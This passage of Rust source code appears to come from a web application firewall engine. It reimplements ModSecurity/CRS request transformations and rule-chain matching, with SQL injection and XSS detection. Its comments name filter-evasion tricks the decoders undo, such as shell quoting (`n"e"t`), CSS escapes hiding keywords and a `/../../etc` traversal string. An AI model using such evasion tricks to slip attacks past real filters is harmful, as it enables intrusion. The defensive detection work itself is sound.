            // value that had no `%uXXXX` in it to begin with.
            "urldecodeuni" | "urldecode" => Self::UrlDecodeUni,
            "htmlentitydecode" => Self::HtmlEntityDecode,
            "jsdecode" => Self::JsDecode,
            "cssdecode" => Self::CssDecode,
            "escapeseqdecode" => Self::EscapeSeqDecode,
            "utf8tounicode" => Self::Utf8ToUnicode,
            "removenulls" => Self::RemoveNulls,
            "removewhitespace" => Self::RemoveWhitespace,
            "compresswhitespace" => Self::CompressWhitespace,
            "replacecomments" => Self::ReplaceComments,
            "removecommentschar" => Self::RemoveCommentsChar,
            "normalizepath" => Self::NormalizePath,
            "normalizepathwin" => Self::NormalizePathWin,
            "cmdline" => Self::CmdLine,
            "base64decode" => Self::Base64Decode,
            "length" => Self::Length,
            _ => return None,
        })
    }

    /// Apply the transformation.  `None` means "output identical to input", so
    /// a chain of no-ops on ordinary traffic allocates nothing.
    ///
    /// Every step is guarded by the cheapest test that can prove it a no-op —
    /// `t:lowercase` on lower-case text, `t:urlDecodeUni` on a value with no
    /// escapes — because on a clean request that is what almost every step is,
    /// and a copy per rule per surface is exactly the cost this rewrite exists
    /// to remove.
    fn apply(self, input: &[u8]) -> Option<Vec<u8>> {
        match self {
            Self::Lowercase => input
                .iter()
                .any(u8::is_ascii_uppercase)
                .then(|| input.iter().map(u8::to_ascii_lowercase).collect::<Vec<u8>>()),
            Self::UrlDecodeUni => url_decode_uni(input),
            Self::HtmlEntityDecode => html_entity_decode(input),
            Self::JsDecode => js_decode(input),
            Self::CssDecode => css_decode(input),
            Self::EscapeSeqDecode => escape_seq_decode(input),
            Self::Utf8ToUnicode => utf8_to_unicode(input),
            Self::RemoveNulls => {
                contains_marker(input, 0, 0).then(|| input.iter().copied().filter(|b| *b != 0).collect::<Vec<u8>>())
            }
            Self::RemoveWhitespace => input.iter().any(|b| is_modsec_space(*b)).then(|| {
                input
                    .iter()
                    .copied()
                    .filter(|b| !is_modsec_space(*b))
                    .collect::<Vec<u8>>()
            }),
            Self::CompressWhitespace => input
                .iter()
                .any(|b| is_modsec_space(*b))
                .then(|| compress_whitespace(input))
                .filter(|out| out.as_slice() != input),
            Self::ReplaceComments => contains_marker(input, b'*', b'*')
                .then(|| replace_comments(input))
                .filter(|out| out.as_slice() != input),
            Self::RemoveCommentsChar => input
                .iter()
                .any(|b| matches!(b, b'/' | b'*' | b'-' | b'#' | b'<'))
                .then(|| remove_comments_char(input))
                .filter(|out| out.as_slice() != input),
            Self::NormalizePath => normalize_path(input, false),
            Self::NormalizePathWin => normalize_path(input, true),
            Self::CmdLine => changed(input, || cmd_line(input)),
            Self::Base64Decode => changed(input, || base64_decode(input)),
            // `t:length` replaces the value with its length; the only input it
            // leaves alone is one that already spells its own length.
            Self::Length => changed(input, || input.len().to_string().into_bytes()),
        }
    }
}

/// Value of up to three octal digits at `start`.
fn octal_value(input: &[u8], start: usize, digits: usize) -> u8 {
    let mut value: u32 = 0;
    for offset in 0..digits {
        let digit = input.get(start + offset).copied().unwrap_or(b'0');
        value = value * 8 + u32::from(digit.saturating_sub(b'0'));
    }
    #[allow(clippy::cast_possible_truncation)]
    let byte = (value & 0xff) as u8;
    byte
}

/// Run `build` and report the result only when it differs from `input`.
fn changed(input: &[u8], build: impl FnOnce() -> Vec<u8>) -> Option<Vec<u8>> {
    let out = build();
    (out.as_slice() != input).then_some(out)
}

/// `ModSecurity` `t:urlDecodeUni`: percent decoding plus the IIS `%uXXXX` form.
///
/// Non-strict: an escape that does not parse is copied through. `%uXXXX` keeps
/// the low byte, and a full-width ASCII code point (`U+FF01`..`U+FF5E`) folds to
/// its ASCII twin, both as `urldecode_uni_nonstrict` does.
fn url_decode_uni(input: &[u8]) -> Option<Vec<u8>> {
    if !may_be_encoded(input) {
        return None;
    }
    let mut out: Vec<u8> = Vec::with_capacity(input.len());
    let mut i = 0usize;
    while let Some(&b) = input.get(i) {
        if b == b'%' {
            if matches!(input.get(i + 1), Some(b'u' | b'U')) {
                let digits = (input.get(i + 2), input.get(i + 3), input.get(i + 4), input.get(i + 5));
                if let (Some(&h3), Some(&h2), Some(&h1), Some(&h0)) = digits
                    && hex_value(h3).is_some()
                    && hex_value(h2).is_some()
                    && let (Some(hi), Some(lo)) = (hex_value(h1), hex_value(h0))
                {
                    let mut byte = hi * 16 + lo;
                    if byte > 0x00 && byte < 0x5f && h3.eq_ignore_ascii_case(&b'f') && h2.eq_ignore_ascii_case(&b'f') {
                        byte += 0x20;
                    }
                    out.push(byte);
                    i += 6;
                    continue;
                }
            } else if let (Some(hi), Some(lo)) = (
                input.get(i + 1).copied().and_then(hex_value),
                input.get(i + 2).copied().and_then(hex_value),
            ) {
                out.push(hi * 16 + lo);
                i += 3;
                continue;
            }
            out.push(b'%');
        } else if b == b'+' {
            out.push(b' ');
        } else {
            out.push(b);
        }
        i += 1;
    }
    (out.as_slice() != input).then_some(out)
}

/// The named HTML entities `ModSecurity` implements, longest first so that
/// `&amp` is not read as `&am`.
const HTML_ENTITIES: [(&[u8], u8); 5] = [
    (b"quot", b'"'),
    (b"nbsp", 0xa0),
    (b"amp", b'&'),
    (b"lt", b'<'),
    (b"gt", b'>'),
];

/// `ModSecurity` `t:htmlEntityDecode`.
///
/// Handles `&#nn;`, `&#xhh;` and the five named entities `ModSecurity`
/// implements (`quot`, `amp`, `lt`, `gt`, `nbsp`), case-insensitively and with
/// the trailing semicolon optional.  A numeric entity above `U+00FF` keeps its
/// low byte, matching the byte-oriented upstream implementation.
fn html_entity_decode(input: &[u8]) -> Option<Vec<u8>> {
    if !contains_marker(input, b'&', b'&') {
        return None;
    }
    let mut out: Vec<u8> = Vec::with_capacity(input.len());
    let mut i = 0usize;
    while let Some(&b) = input.get(i) {
        if b != b'&' {
            out.push(b);
            i += 1;
            continue;
        }
        let mut cursor = i + 1;
        let mut value: Option<u8> = None;
        if input.get(cursor) == Some(&b'#') {
            cursor += 1;
            let hex = matches!(input.get(cursor), Some(b'x' | b'X'));
            if hex {
                cursor += 1;
            }
            let radix: u32 = if hex { 16 } else { 10 };
            let start = cursor;
            let mut number: u32 = 0;
            while let Some(digit) = input.get(cursor).copied().and_then(|c| char::from(c).to_digit(radix)) {
                number = number.saturating_mul(radix).saturating_add(digit);
                cursor += 1;
            }
            if cursor > start {
                // Keep the low byte, as the byte-oriented upstream does.
                #[allow(clippy::cast_possible_truncation)]
                let byte = (number & 0xff) as u8;
                value = Some(byte);
            }
        } else {
            for (name, byte) in HTML_ENTITIES {
                let end = cursor + name.len();
                if input
                    .get(cursor..end)
                    .is_some_and(|candidate| candidate.eq_ignore_ascii_case(name))
                {
                    value = Some(byte);
                    cursor = end;
                    break;
                }
            }
        }
        if let Some(byte) = value {
            out.push(byte);
            if input.get(cursor) == Some(&b';') {
                cursor += 1;
            }
            i = cursor;
        } else {
            out.push(b);
            i += 1;
        }
    }
    (out.as_slice() != input).then_some(out)
}

/// `ModSecurity` `t:jsDecode`: JavaScript escape sequences.
///
/// `\uHHHH` keeps the low byte with the same full-width ASCII fold as
/// `t:urlDecodeUni`; `\xHH` and `\OOO` decode; the single-character escapes
/// `\a \b \f \n \r \t \v` become their control character; any other `\C` drops
/// the backslash, which is exactly how an attacker hides a keyword.
fn js_decode(input: &[u8]) -> Option<Vec<u8>> {
    if !contains_marker(input, b'\\', b'\\') {
        return None;
    }
    let mut out: Vec<u8> = Vec::with_capacity(input.len());
    let mut i = 0usize;
    while let Some(&b) = input.get(i) {
        if b != b'\\' {
            out.push(b);
            i += 1;
            continue;
        }
        let next = input.get(i + 1).copied();
        if next == Some(b'u')
            && let (Some(h3), Some(h2), Some(h1), Some(h0)) = (
                input.get(i + 2).copied(),
                input.get(i + 3).copied(),
                input.get(i + 4).copied(),
                input.get(i + 5).copied(),
            )
            && hex_value(h3).is_some()
            && hex_value(h2).is_some()
            && let (Some(hi), Some(lo)) = (hex_value(h1), hex_value(h0))
        {
            let mut byte = hi * 16 + lo;
            if byte > 0x00 && byte < 0x5f && h3.eq_ignore_ascii_case(&b'f') && h2.eq_ignore_ascii_case(&b'f') {
                byte += 0x20;
            }
            out.push(byte);
            i += 6;
            continue;
        }
        if next == Some(b'x')
            && let (Some(hi), Some(lo)) = (
                input.get(i + 2).copied().and_then(hex_value),
                input.get(i + 3).copied().and_then(hex_value),
            )
        {
            out.push(hi * 16 + lo);
            i += 4;
            continue;
        }
        if let Some(first) = next
            && (b'0'..=b'7').contains(&first)
        {
            let mut digits = 0usize;
            while digits < 3
                && let Some(&d) = input.get(i + 1 + digits)
                && (b'0'..=b'7').contains(&d)
            {
                digits += 1;
            }
            // Three digits only fit in one byte when the first is 0-3; upstream
            // drops the third rather than overflowing.
            if digits == 3 && first > b'3' {
                digits = 2;
            }
            let value = octal_value(input, i + 1, digits);
            out.push(value);
            i += 1 + digits;
            continue;
        }
        if let Some(c) = next {
            out.push(match c {
                b'a' => 0x07,
                b'b' => 0x08,
                b'f' => 0x0c,
                b'n' => b'\n',
                b'r' => b'\r',
                b't' => b'\t',
                b'v' => 0x0b,
                other => other,
            });
            i += 2;
        } else {
            // A trailing backslash escapes nothing and stands for itself.
            out.push(b);
            i += 1;
        }
    }
    (out.as_slice() != input).then_some(out)
}

/// `ModSecurity` `t:cssDecode`: CSS `\hhhhhh` escapes.
///
/// One to six hex digits after a backslash form an escape; the last two digits
/// give the byte, a four-or-more-digit escape whose leading digits are `ff`
/// folds full-width ASCII to its twin, and one following space is consumed.  A
/// backslash before anything else simply disappears, which is how `ex\pression`
/// hides a keyword.
fn css_decode(input: &[u8]) -> Option<Vec<u8>> {
    if !contains_marker(input, b'\\', b'\\') {
        return None;
    }
    let mut out: Vec<u8> = Vec::with_capacity(input.len());
    let mut i = 0usize;
    while let Some(&b) = input.get(i) {
        if b != b'\\' {
            out.push(b);
            i += 1;
            continue;
        }
        let start = i + 1;
        let mut digits = 0usize;
        while digits < 6 && input.get(start + digits).copied().and_then(hex_value).is_some() {
            digits += 1;
        }
        if digits == 0 {
            match input.get(start) {
                // A backslash-newline is a CSS line continuation: both go.
                Some(b'\n') => i = start + 1,
                Some(&other) => {
                    out.push(other);
                    i = start + 1;
                }
                None => {
                    out.push(b);
                    i = start;
                }
            }
            continue;
        }
        let value = if digits == 1 {
            input.get(start).copied().and_then(hex_value).unwrap_or(0)
        } else {
            let hi = input.get(start + digits - 2).copied().and_then(hex_value).unwrap_or(0);
            let lo = input.get(start + digits - 1).copied().and_then(hex_value).unwrap_or(0);
            hi * 16 + lo
        };
        // Full-width ASCII fold, on the two hex digits preceding the byte.
        let full_width = digits >= 4
            && value > 0x00
            && value < 0x5f
            && input
                .get(start + digits - 4)
                .is_some_and(|c| c.eq_ignore_ascii_case(&b'f'))
            && input
                .get(start + digits - 3)
                .is_some_and(|c| c.eq_ignore_ascii_case(&b'f'));
        out.push(if full_width { value + 0x20 } else { value });
        i = start + digits;
        if input.get(i) == Some(&b' ') {
            i += 1;
        }
    }
    (out.as_slice() != input).then_some(out)
}

/// `ModSecurity` `t:escapeSeqDecode`: ANSI C escape sequences.
fn escape_seq_decode(input: &[u8]) -> Option<Vec<u8>> {
    if !contains_marker(input, b'\\', b'\\') {
        return None;
    }
    let mut out: Vec<u8> = Vec::with_capacity(input.len());
    let mut i = 0usize;
    while let Some(&b) = input.get(i) {
        let Some(next) = input.get(i + 1).copied().filter(|_| b == b'\\') else {
            out.push(b);
            i += 1;
            continue;
        };
        let simple = match next {
            b'a' => Some(0x07),
            b'b' => Some(0x08),
            b'f' => Some(0x0c),
            b'n' => Some(b'\n'),
            b'r' => Some(b'\r'),
            b't' => Some(b'\t'),
            b'v' => Some(0x0b),
            b'\\' => Some(b'\\'),
            b'?' => Some(b'?'),
            b'\'' => Some(b'\''),
            b'"' => Some(b'"'),
            _ => None,
        };
        if let Some(c) = simple {
            out.push(c);
            i += 2;
            continue;
        }
        if next == b'x'
            && let (Some(hi), Some(lo)) = (
                input.get(i + 2).copied().and_then(hex_value),
                input.get(i + 3).copied().and_then(hex_value),
            )
        {
            out.push(hi * 16 + lo);
            i += 4;
            continue;
        }
        if (b'0'..=b'3').contains(&next) {
            let mut digits = 0usize;
            while digits < 3
                && let Some(&d) = input.get(i + 1 + digits)
                && (b'0'..=b'7').contains(&d)
            {
                digits += 1;
            }
            out.push(octal_value(input, i + 1, digits));
            i += 1 + digits;
            continue;
        }
        // Not an escape sequence: the backslash stands for itself.
        out.push(b);
        i += 1;
    }
    (out.as_slice() != input).then_some(out)
}

/// `ModSecurity` `t:utf8toUnicode`: rewrite each valid multi-byte UTF-8
/// sequence as `%uXXXX`, so that `t:urlDecodeUni` can then fold it.
///
/// Bytes that are not a valid sequence are copied through, as upstream does.
fn utf8_to_unicode(input: &[u8]) -> Option<Vec<u8>> {
    if input.is_ascii() {
        return None;
    }
    let mut out: Vec<u8> = Vec::with_capacity(input.len());
    let mut i = 0usize;
    while let Some(&b) = input.get(i) {
        let (len, seed) = if b & 0xe0 == 0xc0 {
            (2usize, u32::from(b & 0x1f))
        } else if b & 0xf0 == 0xe0 {
            (3, u32::from(b & 0x0f))
        } else if b & 0xf8 == 0xf0 {
            (4, u32::from(b & 0x07))
        } else {
            (0, 0)
        };
        let mut code = seed;
        let mut valid = len > 0;
        if valid {
            for offset in 1..len {
                match input.get(i + offset) {
                    Some(&cont) if cont & 0xc0 == 0x80 => code = (code << 6) | u32::from(cont & 0x3f),
                    _ => {
                        valid = false;
                        break;
                    }
                }
            }
        }
        if valid {
            out.extend_from_slice(format!("%u{code:04x}").as_bytes());
            i += len;
        } else {
            out.push(b);
            i += 1;
        }
    }
    (out.as_slice() != input).then_some(out)
}

/// `ModSecurity` `t:compressWhitespace`: runs of whitespace become one space.
fn compress_whitespace(input: &[u8]) -> Vec<u8> {
    let mut out: Vec<u8> = Vec::with_capacity(input.len());
    let mut in_space = false;
    for &b in input {
        if is_modsec_space(b) {
            if !in_space {
                out.push(b' ');
                in_space = true;
            }
        } else {
            in_space = false;
            out.push(b);
        }
    }
    out
}

/// `ModSecurity` `t:replaceComments`: each `/* ... */` becomes one space, and an
/// unterminated `/*` swallows the rest of the value.
fn replace_comments(input: &[u8]) -> Vec<u8> {
    let mut out: Vec<u8> = Vec::with_capacity(input.len());
    let mut i = 0usize;
    let mut in_comment = false;
    while let Some(&b) = input.get(i) {
        if in_comment {
            if b == b'*' && input.get(i + 1) == Some(&b'/') {
                in_comment = false;
                out.push(b' ');
                i += 2;
            } else {
                i += 1;
            }
        } else if b == b'/' && input.get(i + 1) == Some(&b'*') {
            in_comment = true;
            i += 2;
        } else {
            out.push(b);
            i += 1;
        }
    }
    if in_comment {
        out.push(b' ');
    }
    out
}

/// `ModSecurity` `t:removeCommentsChar`: delete comment markers without
/// touching what they surround.
fn remove_comments_char(input: &[u8]) -> Vec<u8> {
    let mut out: Vec<u8> = Vec::with_capacity(input.len());
    let mut i = 0usize;
    while let Some(&b) = input.get(i) {
        let two = |a: u8, c: u8| b == a && input.get(i + 1) == Some(&c);
        if two(b'/', b'*') || two(b'*', b'/') || two(b'-', b'-') {
            i += 2;
        } else if b == b'<' && input.get(i + 1..i + 4) == Some(b"!--".as_slice()) {
            i += 4;
        } else if b == b'#' {
            i += 1;
        } else {
            out.push(b);
            i += 1;
        }
    }
    out
}

/// `ModSecurity` `t:normalizePath` / `t:normalizePathWin`.
///
/// Implements the documented semantics — collapse repeated slashes, drop `.`
/// segments, resolve `..` against the preceding segment, and (for the `Win`
/// form) treat `\` as a separator.  A leading `..` on a relative path is kept:
/// there is no segment above it to cancel.  An absolute path cannot be walked
/// above its root, which is what stops `/../../etc` becoming `/etc` here while
/// upstream leaves it at the root.
fn normalize_path(input: &[u8], windows: bool) -> Option<Vec<u8>> {
    let separators = windows && contains_marker(input, b'\\', b'\\');
    if !separators && !contains_marker(input, b'.', b'/') {
        // Nothing to collapse and no reference to resolve.
        return None;
    }
    let source: Cow<'_, [u8]> = if separators {
        Cow::Owned(input.iter().map(|&b| if b == b'\\' { b'/' } else { b }).collect())
    } else {
        Cow::Borrowed(input)
    };
    let absolute = source.first() == Some(&b'/');
    let trailing = source.len() > 1 && source.last() == Some(&b'/');

    let mut segments: Vec<&[u8]> = Vec::new();
    for segment in source.split(|&b| b == b'/') {
        match segment {
            // Repeated separators and self-references contribute nothing.
            b"" | b"." => {}
            b".." => match segments.last() {
                Some(&last) if last != b".." => {
                    segments.pop();
                }
                _ => {
                    if !absolute {
                        segments.push(b"..");
                    }
                }
            },
            other => segments.push(other),
        }
    }

    let mut out: Vec<u8> = Vec::with_capacity(source.len());
    if absolute {
        out.push(b'/');
    }
    for (index, segment) in segments.iter().enumerate() {
        if index > 0 {
            out.push(b'/');
        }
        out.extend_from_slice(segment);
    }
    if trailing && !segments.is_empty() {
        out.push(b'/');
    }
    (out.as_slice() != input).then_some(out)
}

/// `ModSecurity` `t:cmdLine`: fold the shell-quoting tricks that let
/// `n"e"t` mean `net`.
///
/// The documented steps, in order: delete `\ " ' ^`, turn `,` and `;` into
/// spaces, collapse runs of whitespace into one space, delete a space before
/// `/` or `(`, and lower-case the rest.
fn cmd_line(input: &[u8]) -> Vec<u8> {
    let mut out: Vec<u8> = Vec::with_capacity(input.len());
    for &b in input {
        match b {
            // Shell quoting characters simply disappear: `n"e"t` is `net`.
            b'\\' | b'"' | b'\'' | b'^' => {}
            // `,` and `;` become spaces, and runs of whitespace collapse to one.
            b',' | b';' => {
                if out.last() != Some(&b' ') {
                    out.push(b' ');
                }
            }
            _ if is_modsec_space(b) => {
                if out.last() != Some(&b' ') {
                    out.push(b' ');
                }
            }
            b'/' | b'(' => {
                if out.last() == Some(&b' ') {
                    out.pop();
                }
                out.push(b);
            }
            other => out.push(other.to_ascii_lowercase()),
        }
    }
    out
}

/// `ModSecurity` `t:base64Decode`: decode the leading run of base64, stopping
/// at padding or at the first character outside the alphabet.
fn base64_decode(input: &[u8]) -> Vec<u8> {
    let mut out: Vec<u8> = Vec::with_capacity(input.len() / 4 * 3 + 3);
    let mut accumulator: u32 = 0;
    let mut bits = 0u32;
    for &b in input {
        let Some(value) = base64_value(b) else { break };
        accumulator = (accumulator << 6) | u32::from(value);
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            #[allow(clippy::cast_possible_truncation)]
            out.push(((accumulator >> bits) & 0xff) as u8);
        }
    }
    out
}

/// Value of one base64 alphabet character; `None` for padding and anything else.
const fn base64_value(b: u8) -> Option<u8> {
    match b {
        b'A'..=b'Z' => Some(b - b'A'),
        b'a'..=b'z' => Some(b - b'a' + 26),
        b'0'..=b'9' => Some(b - b'0' + 52),
        b'+' => Some(62),
        b'/' => Some(63),
        _ => None,
    }
}

/// A rule's ordered `t:` chain.
///
/// `id` identifies the *step list*, not the rule: the shipped CRS declares 181
/// transformed conditions but only 39 distinct chains, and 70 of those
/// conditions are the same single `t:urlDecodeUni`.  Interning them lets one
/// request transform a surface once per chain instead of once per rule
/// ([`RequestView::transformed`]).
struct TransformChain {
    /// Index into the load's chain table, or [`Self::UNINTERNED`].
    id: u32,
    steps: Box<[Transform]>,
}

impl TransformChain {
    /// A chain built outside a load (unit tests): never memoised, because its
    /// id is not a table index.
    const UNINTERNED: u32 = u32::MAX;

    /// Resolve the names a rule declared, refusing the first one this engine
    /// cannot perform.
    fn parse_steps(position: &str, names: &[String]) -> Result<Vec<Transform>, RejectReason> {
        let mut steps = Vec::with_capacity(names.len());
        for name in names {
            let step = Transform::parse(name).ok_or_else(|| RejectReason::UnsupportedTransformation {
                position: position.to_owned(),
                name: name.clone(),
            })?;
            steps.push(step);
        }
        Ok(steps)
    }

    #[cfg(test)]
    fn compile(position: &str, names: &[String]) -> Result<Self, RejectReason> {
        Ok(Self {
            id: Self::UNINTERNED,
            steps: Self::parse_steps(position, names)?.into_boxed_slice(),
        })
    }

    /// `true` for a rule that declared no transformation (or only `t:none`).
    fn is_identity(&self) -> bool {
        self.steps.is_empty()
    }

    /// Run the chain.  `None` means the value came out unchanged, which is the
    /// answer for an empty chain and for the many chains that are no-ops on
    /// ordinary traffic (`t:urlDecodeUni` on a value with no escapes,
    /// `t:lowercase` on lower-case text), so the hot path allocates nothing.
    fn apply(&self, value: &str) -> Option<String> {
        let mut current: Option<Vec<u8>> = None;
        for step in &self.steps {
            let next = current
                .as_ref()
                .map_or_else(|| step.apply(value.as_bytes()), |buffer| step.apply(buffer));
            if let Some(next) = next {
                current = Some(next);
            }
        }
        let bytes = current?;
        // Byte-level transformations can produce sequences that are not valid
        // UTF-8 (`t:urlDecodeUni` on `%e4` is one byte of a truncated character).
        // The matchers work on `str`, so the same lossy conversion the request
        // body already goes through is applied here.
        let text = String::from_utf8_lossy(&bytes).into_owned();
        (text != value).then_some(text)
    }
}

// ── Operands ──────────────────────────────────────────────────────────────────

/// One piece of a `ModSecurity` operand after macro expansion.
#[derive(Debug)]
enum OperandPart {
    Lit(String),
    /// `%{TX.N}` — capture group `N` of the last capturing condition.
    Capture(u8),
    /// `%{REQUEST_HEADERS.HOST}` — the request's `Host` header.
    Host,
}

/// The right-hand side of a string comparison.
///
/// CRS chains compare a capture against another capture
/// (`SecRule TX:1 "@streq %{TX.2}"`, CRS-942130) or against a request header
/// (`SecRule TX:1 "!@endsWith %{request_headers.host}"`, CRS-943110).  Storing
/// the operand as parts keeps the overwhelmingly common literal case a single
/// borrow while making those two forms expressible instead of comparing
/// against the uninterpreted text `%{TX.2}`.
#[derive(Debug)]
struct Operand(Vec<OperandPart>);

impl Operand {
    /// Parse the CRS macro syntax.
    ///
    /// Returns `None` for a macro this engine cannot expand, so the rule is
    /// rejected at load time rather than silently comparing against a literal
    /// `%{...}` that no request will ever contain.
    fn parse(raw: &str) -> Option<Self> {
        let mut parts = Vec::new();
        let mut rest = raw;
        while let Some(start) = rest.find("%{") {
            let (before, from_macro) = rest.split_at(start);
            if !before.is_empty() {
                parts.push(OperandPart::Lit(before.to_owned()));
            }
            let body = from_macro.get(2..)?;
            let end = body.find('}')?;
            let (name, after) = body.split_at(end);
            parts.push(Self::macro_part(name)?);
            rest = after.get(1..)?;
        }
        if !rest.is_empty() || parts.is_empty() {
            parts.push(OperandPart::Lit(rest.to_owned()));
        }
        Some(Self(parts))
    }

    fn macro_part(name: &str) -> Option<OperandPart> {
        let lower = name.trim().to_ascii_lowercase();
        if let Some(index) = lower.strip_prefix("tx.") {
            return index.parse::<u8>().ok().map(OperandPart::Capture);
        }
        (lower == "request_headers.host").then_some(OperandPart::Host)
    }

    /// The whole operand when it is a single literal, for load-time checks.
    fn literal(&self) -> Option<&str> {
        match (self.0.len(), self.0.first()) {
            (1, Some(OperandPart::Lit(text))) => Some(text.as_str()),
            _ => None,
        }
    }

    /// Highest `%{TX.N}` index referenced, for load-time validation.
    fn max_capture(&self) -> Option<u8> {
        self.0
            .iter()
            .filter_map(|p| match p {
                OperandPart::Capture(n) => Some(*n),
                OperandPart::Lit(_) | OperandPart::Host => None,
            })
            .max()
    }

    /// Expand against the current chain state.  `None` when a referenced
    /// capture or header is absent, which makes the comparison fail rather
    /// than succeed against an empty string.
    fn resolve<'s>(&'s self, ctx: &RequestCtx, state: &ChainState<'_>) -> Option<Cow<'s, str>> {
        if let (1, Some(OperandPart::Lit(text))) = (self.0.len(), self.0.first()) {
            return Some(Cow::Borrowed(text.as_str()));
        }
        let mut out = String::new();
        for part in &self.0 {
            match part {
                OperandPart::Lit(text) => out.push_str(text),
                OperandPart::Capture(n) => out.push_str(state.captures.get(usize::from(*n))?),
                OperandPart::Host => out.push_str(ctx.headers.get("host")?),
            }
        }
        Some(Cow::Owned(out))
    }
}

// ── Chain evaluation state ────────────────────────────────────────────────────

/// Result of testing one value.
enum Outcome {
    Match,
    NoMatch,
    /// The comparison could not be made at all — a `%{...}` operand names
    /// something this request does not have.
    ///
    /// Distinct from `NoMatch` because negation must not turn it into a hit:
    /// `!@endsWith %{request_headers.host}` on a request with no `Host` header
    /// would otherwise fire on every such request.
    Unresolvable,
}

/// Carried between the conditions of one chained rule, for one request.
///
/// Both collections hold **transformed** values, as `ModSecurity` does: a
/// chain link reading `MATCHED_VARS` or `TX:N` sees the text its predecessor's
/// `t:` chain produced, not the bytes off the wire, and then applies its own
/// `t:` chain on top of that.
#[derive(Default)]
struct ChainState<'a> {
    /// The values the most recent condition matched — `ModSecurity`
    /// `MATCHED_VAR` / `MATCHED_VARS`.
    matched: Vec<Cow<'a, str>>,
    /// `tx:0`..`tx:N` from the most recent condition that declared `capture`;
    /// index 0 is the whole match, as in `ModSecurity`.
    captures: Vec<String>,
}

// ── Compiled rule ─────────────────────────────────────────────────────────────

enum CompiledMatcher {
    Regex(Regex),
    Contains(Operand),
    /// Case-sensitive exact comparison (`ModSecurity` `@streq` / `@eq`).
    Equals(Operand),
    /// `ModSecurity` `@beginsWith`.
    StartsWith(Operand),
    /// `ModSecurity` `@endsWith`.
    EndsWith(Operand),
    NotIn(Vec<String>),
    Gt(i64),
    Lt(i64),
    /// Aho-Corasick phrase set — backs `contains_any` (`@pm`) and
    /// `pm_from_file` (`@pmFromFile`).  Shared so several rules referencing
    /// the same wordlist compile the automaton once.
    MultiPattern(Arc<AhoCorasick>),
    /// libinjection SQL injection detection (CRS-942100 etc.)
    DetectSqli,
    /// libinjection XSS detection (CRS-941100 etc.)
    DetectXss,
}

impl CompiledMatcher {
    /// Test one value, already transformed by the rule's `t:` chain.
    ///
    /// Nothing is decoded here: what a value looks like when a matcher sees it
    /// is decided by the surface's parser normalisation and by the rule's
    /// declared transformations, both of which have already run.  That is the
    /// whole point — CRS-920610 (`@contains #`, `t:none`, `REQUEST_URI_RAW`)
    /// and CRS-941181 (`@contains -->`, `t:urlDecodeUni`, `ARGS`) are the same
    /// operator on opposite requirements, and only the rule can say which.
    fn test(&self, value: &str, ctx: &RequestCtx, state: &ChainState<'_>) -> Outcome {
        let plain = |hit: bool| if hit { Outcome::Match } else { Outcome::NoMatch };
        macro_rules! operand {
            ($operand:expr) => {
                match $operand.resolve(ctx, state) {
                    Some(resolved) => resolved,
                    None => return Outcome::Unresolvable,
                }
            };
        }
        match self {
            Self::Regex(re) => plain(re.is_match(value)),
            Self::Contains(operand) => plain(value.contains(operand!(operand).as_ref())),
            Self::Equals(operand) => plain(value == operand!(operand).as_ref()),
            Self::StartsWith(operand) => plain(value.starts_with(operand!(operand).as_ref())),
            Self::EndsWith(operand) => plain(value.ends_with(operand!(operand).as_ref())),
            Self::NotIn(list) => plain(!list.iter().any(|allowed| allowed.eq_ignore_ascii_case(value))),
            Self::Gt(n) => plain(value.parse::<i64>().is_ok_and(|v| v > *n)),
            Self::Lt(n) => plain(value.parse::<i64>().is_ok_and(|v| v < *n)),
            Self::MultiPattern(ac) => plain(ac.is_match(value)),
            Self::DetectSqli => plain(libinjectionrs::detect_sqli(value.as_bytes()).is_injection()),
            Self::DetectXss => plain(libinjectionrs::detect_xss(value.as_bytes()).is_injection()),
        }
    }
}

/// Where a condition reads its values from.
#[derive(Debug, Clone, PartialEq, Eq)]
enum CondField {
    /// A request surface.
    Request(Field),
    /// `ModSecurity` `MATCHED_VAR` / `MATCHED_VARS`: the values the preceding
    /// condition matched.  Only meaningful inside a chain.
    MatchedValue,
    /// `ModSecurity` `TX:N`: capture group `N` of the last capturing condition.
    Capture(u8),
}

/// Resolve a condition's `field` name.
///
/// The two chain pseudo-fields are spelled apart from the request surfaces so
/// a rule file can never accidentally name one: `matched_value` and `tx:N`
/// contain no character sequence a `Surfaces` list can produce.
fn parse_cond_field(name: &str) -> Option<CondField> {
    if name == "matched_value" {
        return Some(CondField::MatchedValue);
    }
    if let Some(index) = name.strip_prefix("tx:") {
        return index.parse::<u8>().ok().map(CondField::Capture);
    }
    Field::parse(name).map(CondField::Request)
}

/// One condition of a rule: the head, or one link of its chain.
struct Condition {
    field: CondField,
    matcher: CompiledMatcher,
    /// `ModSecurity` `t:` chain for this condition, applied to every value
    /// before the matcher sees it.
    transform: TransformChain,
    /// `!@op`: the condition holds for values the matcher rejects.
    negate: bool,
    /// Bind this condition's regex groups to `tx:0..` for later conditions.
    capture: bool,
}

impl Condition {
    /// Short-circuiting test used for the head of every rule.
    ///
    /// Allocation-free on the hot path: the surfaces are already normalised in
    /// the [`RequestView`], the transformation chain borrows when it changes
    /// nothing, and an ordinary request is answered by the first surface that
    /// fails without recording anything about the match.
    fn matches_any(&self, view: &RequestView<'_>) -> bool {
        let CondField::Request(field) = &self.field else {
            // A bare `matched_value` / `tx:N` head has nothing to read; the
            // loader rejects it, so this is unreachable in a loaded rule set.
            return false;
        };
        let empty = ChainState::default();
        field.any_value(view, |value| {
            let transformed = view.transformed(&self.transform, value);
            let subject = transformed.as_deref().unwrap_or(value);
            match self.matcher.test(subject, view.ctx, &empty) {
                Outcome::Match => !self.negate,
                Outcome::NoMatch => self.negate,
                Outcome::Unresolvable => false,
            }
        })
    }

    /// Every value of this condition's field that satisfies it, transformed.
    ///
    /// Used for the head of a chained rule, which is re-evaluated one value at
    /// a time so each hit can drive the chain on its own — see
    /// [`CompiledRule::matches`].
    fn hits<'v>(&self, view: &'v RequestView<'_>) -> Vec<Cow<'v, str>> {
        let CondField::Request(field) = &self.field else {
            return Vec::new();
        };
        let empty = ChainState::default();
        let mut hits: Vec<Cow<'v, str>> = Vec::new();
        for value in field.collect_values(view) {
            let subject: Cow<'v, str> = self.transform.apply(&value).map_or(value, Cow::Owned);
            match (self.matcher.test(&subject, view.ctx, &empty), self.negate) {
                (Outcome::Match, false) | (Outcome::NoMatch, true) => hits.push(subject),
                _ => {}
            }
        }
        hits
    }

    /// Seed a fresh chain state from one value this condition matched.
    ///
    /// `MATCHED_VARS` becomes exactly that value and `TX:N` its capture groups,
    /// which is what a chain link expects to read: for a per-parameter field the
